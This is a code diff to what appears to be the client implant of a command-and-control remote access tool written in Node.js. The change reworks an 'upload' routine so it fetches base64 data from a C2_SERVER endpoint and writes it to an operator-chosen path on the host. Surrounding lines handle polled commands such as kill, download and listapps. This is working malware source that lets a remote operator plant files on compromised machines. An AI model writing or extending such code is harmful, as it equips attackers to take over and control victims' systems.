@@ -65,33 +65,35 @@ function generateSessionID() {
     return result
 }
 
-function uploadFile(file) {
-    if (file == ""){
-        return
-    } else {
-        try {
-            https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
-            let data = '';
+function uploadFile(file, destination) {
 
-                res.on('data', chunk => {
-                    data += chunk;
-                });
+    try {
+        https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
+        let data = '';
 
-                res.on('end', () => {
-                    const base64String = data;
-                    const filePath = file;
-
-                    const cleaned = base64String.split(',')[1] || base64String;
-
-                    const buffer = Buffer.from(cleaned, 'base64');
-
-                    fs.writeFileSync(filePath, buffer);
-                });
+            res.on('data', chunk => {
+                data += chunk;
             });
-        } catch {
-            console.error("Error uploading file.")
-        }   
-    }
+
+            res.on('end', () => {
+                const base64String = data;
+                const filePath = destination;
+                
+                const cleaned = base64String.split(',')[1] || base64String;
+
+                const buffer = Buffer.from(cleaned, 'base64');
+                try {
+                    fs.writeFileSync(filePath, buffer);
+                } catch {
+                    sendOutput("Invalid destination!")
+                }
+                    
+            });
+        });
+    } catch {
+        console.error("Error uploading file.")
+    }   
+
 
     
     
@@ -219,7 +221,9 @@ function pollServer() {
                     } else if (data == "kill") {
                         process.kill(process.pid, "SIGINT");
                     } else if (data.split(' ')[0] == "upload") {
-                        uploadFile(data.split(' ')[1]);
+                        fileToUpload = data.split(' ')[1]
+                        fileDestination = data.split(' ')[2]
+                        uploadFile(fileToUpload, fileDestination);
                     } else if (data.split(' ')[0] == "download") {
                         downloadFile(data.split(' ')[1]);
                     } else if (data == "listapps") {
